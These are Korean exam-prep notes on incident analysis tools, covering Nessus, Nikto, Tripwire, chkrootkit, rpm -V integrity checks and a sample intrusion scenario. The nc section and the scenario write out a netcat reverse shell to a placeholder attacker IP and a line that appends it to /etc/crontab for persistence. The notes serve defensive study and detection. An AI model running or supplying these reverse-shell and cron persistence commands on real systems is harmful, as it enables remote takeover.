@@ -1,0 +1,232 @@
+> 섹션 14는 취약점 스캐너(Nessus·Nikto) + 무결성 검사(Tripwire) + 루트킷 탐지(chkrootkit) + rpm 명령어 기반 침해 분석이 핵심이며, 실제 침해사고 시나리오 분석 서술형으로 자주 출제됩니다. 특히 Tripwire vs Nessus 비교, chkrootkit 동작 원리, `rpm -V` 무결성 검사, 침해사고 분석 절차가 반드시 나오는 최빈출 포인트입니다.
+
+## 1. 개념 및 배경
+
+시스템 접근 도구는 공격자의 침투 경로 분석 및 시스템 무결성 점검을 목적으로 합니다. 방어 측에서는 취약점 스캐너로 사전 점검 → 무결성 검사 도구로 변조 탐지 → 루트킷 탐지 도구로 은닉 프로세스 발견하는 3단계 흐름으로 운영합니다.
+
+## 2. 동작 원리 / 구조
+
+### 🔍 취약점 스캐너 — Nessus & Nikto
+
+**도구 비교**
+
+| 구분 | Nessus | Nikto |
+|------|--------|-------|
+| 개발사/특징 | Tenable사, 상용(무료버전 있음) | 오픈소스 |
+| 탐지 대상 | 시스템 전반 (OS, 네트워크, 서비스) | 웹 서버 전용 취약점 스캐너 |
+| 탐지 방식 | 포트 스캔 + 취약점 DB 대조 | CGI, 구성 오류, DB 기반 점검 |
+| 포트 | `8834/tcp` (웹 인터페이스) | — |
+| 시작 명령 | `/etc/init.d/nessusd restart` | `nikto -h [IP] -output vul.html -Format html` |
+| 결과 형식 | GUI 및 보고서 | HTML 리포트 출력 가능 |
+
+> 📌 시험 핵심: "Nessus = 시스템 전반 취약점 스캐너 (Tenable), Nikto = 웹서버 취약점 스캐너 (CGI/DB 기반)" — 둘의 차이 서술 필수!
+
+### 🔒 무결성 검사 도구 — Tripwire
+
+**Tripwire 개념**
+
+- H-IDS(Host-based IDS)의 대표 도구
+- 파일·디렉터리의 해시값(MD5, SHA 등)을 기준 DB로 저장 후, 변경 시 탐지
+- 주로 시스템 파일 변조, 백도어 설치 탐지에 사용
+
+**Tripwire 동작 절차 (순서 암기 필수!)**
+
+```text
+1단계: tripwire --init    → 기준(Baseline) 해시 DB 생성
+2단계: 운영 (정상 서비스 운용)
+3단계: tripwire --check   → 현재 파일 해시와 기준 DB 비교
+4단계: 리포트 생성          → 변경된 파일 목록 출력
+       저장 위치: /var/lib/tripwire/*.twd
+```
+
+> 📌 시험 핵심: "`tripwire --init` → DB 생성, `tripwire --check` → 무결성 검사" 두 명령어는 반드시 암기!
+
+> 🔍 **보완**: Tripwire 동작 원리는 "설치 직후(신뢰 가능한 상태)의 파일 해시를 기준 DB(Baseline)로 저장 → 이후 주기적으로 현재 해시와 기준 DB를 비교 → 불일치 시 변조로 탐지"입니다. 따라서 기준 DB는 시스템이 깨끗할 때 생성해야 신뢰성이 보장되며, 정책 파일과 DB는 서명·읽기전용 매체로 보호해야 공격자의 DB 위조를 막을 수 있습니다.
+
+### 🦠 루트킷 탐지 — chkrootkit
+
+**Rootkit 개념**
+
+- 공격자가 시스템 침투 후 은닉 유지를 위해 설치하는 악성 도구 모음
+- `ps`, `netstat`, `ls` 등의 시스템 명령어 자체를 변조하여 프로세스·파일 숨김
+- Kernel rootkit: `/proc` 파일시스템 조작으로 프로세스 은닉
+
+**chkrootkit 동작 원리**
+
+```bash
+# chkrootkit 실행 (quiet 모드 - 이상 항목만 출력)
+chkrootkit -q
+
+# 결과 예시
+INFECTED: /bin/ps      → ps 명령어가 루트킷으로 변조됨
+INFECTED: /bin/netstat → netstat 명령어 변조됨
+```
+
+**루트킷에 의한 Hidden Process 탐지 원리**
+
+| 방법 | 설명 |
+|------|------|
+| `/proc` 직접 확인 | `/proc/[PID]/exe`, `/proc/[PID]/cmdline`에서 실제 실행 파일 확인 |
+| ps vs /proc 비교 | `ps`가 숨기는 PID를 `/proc`에서는 확인 가능 → 불일치 = 루트킷 의심 |
+
+```bash
+# 1. ps로 은닉된 프로세스 확인 안 됨 (ps 자체 변조)
+ps -ef | grep bdoor
+
+# 2. /proc에서 직접 확인 가능
+ls -al /proc/15415/exe → bdoor 발견!
+
+# 3. 실행파일 복사 후 분석
+cp /proc/15415/exe /tmp/backdoor
+
+# 4. 실행 명령어 확인
+cat /proc/15415/cmdline
+```
+
+### ⚙️ rpm 명령어 기반 무결성 검사 (Linux) ⭐⭐⭐
+
+루트킷이 `/bin/ps`, `/bin/netstat` 등을 변조했을 때 → rpm으로 검증
+
+**rpm 핵심 명령어**
+
+```bash
+# 1. 해당 파일이 어떤 패키지에 속하는지 확인
+rpm -qf /bin/netstat → net-tools 패키지
+rpm -qf /bin/ps      → procps 패키지
+
+# 2. 패키지 무결성 검증 (변조 여부 확인)
+rpm -V net-tools procps
+rpm -V /bin/netstat /bin/ps
+
+# 3. 강제 재설치 (원본 복구)
+rpm -Uvh --force [패키지명]
+
+# 4. 파일 속성 확인 (immutable 플래그)
+lsattr /bin/netstat /bin/ps
+
+# 5. immutable 플래그 제거 후 재설치
+chattr -i /bin/netstat /bin/ps → i 플래그 해제
+rpm -Uvh --force [패키지명]      → 원본 복구
+
+# 6. 재설치 후 immutable 설정
+chattr +i /bin/netstat /bin/ps → 변조 방지
+```
+
+**`rpm -V` 출력 코드 해석**
+
+출력 순서는 `SM5DLUGT` 8자리로 표시되며, 이상 없는 항목은 `.`으로 나옵니다.
+
+| 코드 | 의미 |
+|------|------|
+| S | 파일 크기(Size) 변경 |
+| M | 파일 권한(Mode) 변경 |
+| 5 | MD5 체크섬 불일치 (변조 확실) |
+| D | 장치(Device) 번호 변경 |
+| L | 심볼릭링크(readLink) 경로 변경 |
+| U | 소유자(User) 변경 |
+| G | 그룹(Group) 변경 |
+| T | 타임스탬프(mTime) 변경 |
+
+> 📌 `5` (MD5 불일치)가 뜨면 파일 내용이 변조된 것 — 서술형에서 "MD5 체크섬 불일치로 파일 변조 확인"으로 작성
+
+> 🔍 **보완**: 출력 예시 `S.5....T. /bin/ps`는 크기(S)·MD5(5)·타임스탬프(T)가 변경되었다는 의미로, `/bin/ps` 바이너리가 루트킷으로 변조되었음을 나타냅니다.
+
+**chattr 플래그 핵심 암기**
+
+| 플래그 | 의미 | 명령어 |
+|--------|------|--------|
+| i | Immutable — 삭제·수정·이름변경 불가 | `chattr +i 파일`, `chattr -i 파일` |
+| a | Append only — 추가만 가능 (로그파일 보호) | `chattr +a 파일` |
+| A | Access Time 업데이트 금지 | `chattr +A 파일` |
+
+### 🔗 nc(Netcat) — 네트워크 연결 도구
+
+**nc 기본 사용법**
+
+```bash
+# Reverse Shell 생성 (공격자 서버에서)
+# 1. 공격자: 포트 80 리스닝
+nc -lvp 80
+# 2. 피해자 서버에서 (침해 후 실행)
+nc [공격자IP] [Port] -e /bin/bash
+
+# 3. cron에 등록하여 지속성 유지
+echo "30 2 * * * root /usr/bin/nc [IP] [Port] -e /bin/bash" >> /etc/crontab
+```
+
+## 3. 예시 / 적용 시나리오
+
+### 🎯 기출 최빈출: Nessus 취약점 발견 → 침해사고 분석 시나리오
+
+**실제 기출 흐름**
+
+```text
+[침해사고 시나리오]
+1. Nessus로 Tomcat 취약점 발견
+2. 취약점 이용해 /tmp에 wget으로 악성파일 다운로드
+3. tar 압축 해제 후 설치
+4. cron에 Reverse Shell 등록
+   echo "0 3 * * * root /usr/bin/nc IP Port -e /bin/bash" >> /etc/crontab
+5. 시스템 장악
+
+[분석 절차]
+1단계:  Tomcat 취약점 패치
+2단계:  chkrootkit, netstat로 이상 프로세스 확인
+3단계:  ps -ef (11자리 이상 PID → 은닉 프로세스 의심)
+       find /bin -type f -mtime -10 | xargs ls -l (최근 10일 내 변경 파일 탐지)
+4단계:  rpm -qf /bin/netstat /bin/ps → 패키지 확인
+5단계:  rpm -V net-tools procps → MD5(5), 크기(S), 시간(T) 불일치 확인
+6단계:  rpm -Uvh --force [패키지] → 원본 복구
+7단계:  lsattr /bin/netstat /bin/ps → i 플래그 확인
+8단계:  chattr -i 후 재설치 → chattr +i 설정
+9단계:  ps -ef | grep nc → nc 프로세스 탐지
+10단계: netstat -antp | grep [IP] → 외부 연결 확인
+11단계: /var/log/cron 확인 → nc cron 등록 확인
+       cat /etc/crontab → cron 내용 확인
+```
+
+### 🔍 보완: 침해사고 대응 6단계 절차
+
+| 단계 | 영문 | 핵심 활동 |
+|------|------|----------|
+| 1. 준비 | Preparation | 대응 체계·정책 수립, 도구·로그 수집 환경 구축 |
+| 2. 탐지·식별 | Detection & Analysis | 침해 징후 탐지, 사고 여부·범위 판단 |
+| 3. 분석 | Analysis | 로그·프로세스·파일 분석으로 공격 경로·원인 규명 |
+| 4. 대응·격리 | Containment | 감염 시스템 격리, 확산 차단, 공격 경로 차단 |
+| 5. 복구 | Recovery | 원본 파일 복구, 백도어·계정 제거, 정상 서비스 재개 |
+| 6. 사후·교훈 | Lessons Learned | 재발 방지 대책 수립, 보고서 작성, 정책 개선 |
+
+> 🔍 **보완**: NIST SP 800-61 기준 침해대응 생명주기는 크게 준비(Preparation) → 탐지·분석(Detection & Analysis) → 봉쇄·근절·복구(Containment, Eradication & Recovery) → 사후활동(Post-Incident Activity)의 4단계로 묶이며, 국내 시험에서는 위 6단계(준비-탐지-분석-대응-복구-교훈)로 세분화해 자주 출제됩니다.
+
+**기출 시나리오: proc 파일시스템 은닉 프로세스 분석**
+
+```text
+Q. ls -al /proc/5900/exe 명령어로 삭제(delete) 상태임을 확인했다.
+   1. 이 프로세스의 상태는?
+   2. /tmp/backdoor로 복사하려면?
+   3. 명령어 확인 방법은?
+
+답:
+1. 파일이 실행 중이지만 디스크에서 이미 삭제된 상태
+   (공격자가 흔적 지우기 위해 실행 후 원본 파일 삭제)
+2. cp /proc/5900/exe /tmp/backdoor
+3-1. cat /proc/5900/cmdline → 실행 명령어 확인
+3-2. lsof -p 5900            → 열린 파일/소켓 확인
+```
+
+## 4. 실무 및 시험 포인트 정리
+
+| 주제 | 핵심 내용 | 출제 빈도 |
+|------|----------|----------|
+| Nessus vs Nikto 비교 | Nessus=시스템전반(Tenable), Nikto=웹서버(CGI/DB) | ⭐⭐⭐ |
+| Tripwire 절차 | `--init` (DB생성) → `--check` (무결성 검사) | ⭐⭐⭐ |
+| chkrootkit | `-q` 옵션, INFECTED 결과, /proc vs ps 불일치 탐지 | ⭐⭐⭐ |
+| `rpm -V` 코드 | `5`=MD5변조, `S`=크기변경, `T`=시간변경 | ⭐⭐⭐ |
+| rpm 복구 절차 | qf → V → 변조확인 → `Uvh --force` → lsattr → `chattr -i/+i` | ⭐⭐⭐ |
+| chattr 플래그 | `i`=Immutable(변경불가), `a`=AppendOnly(로그보호) | ⭐⭐ |
+| nc Reverse Shell | `nc -lvp 80` + `nc IP Port -e /bin/bash` | ⭐⭐ |
+| /proc 은닉 프로세스 | `/proc/[PID]/exe`, `cmdline`, `cp /proc/PID/exe` | ⭐⭐⭐ |
+| cron 백도어 | `/etc/crontab`에 nc 등록 → `/var/log/cron`으로 탐지 | ⭐⭐ |
+| find 변조 탐지 | `find /bin -type f -mtime -10 \| xargs ls -l` | ⭐⭐ |
+
+> 📌 서술형 고득점 전략: 침해사고 분석 절차 문제는 "취약점 발견 → 침투 → 루트킷 설치 → cron 등록 → 분석 → 복구" 흐름을 단계별로 명시하고, 각 단계에서 사용하는 구체적인 명령어(`rpm -qf`, `rpm -V`, `chkrootkit -q`, `ps -ef`, `netstat -antp`, `cat /proc/PID/cmdline`)를 함께 작성하면 고득점입니다.
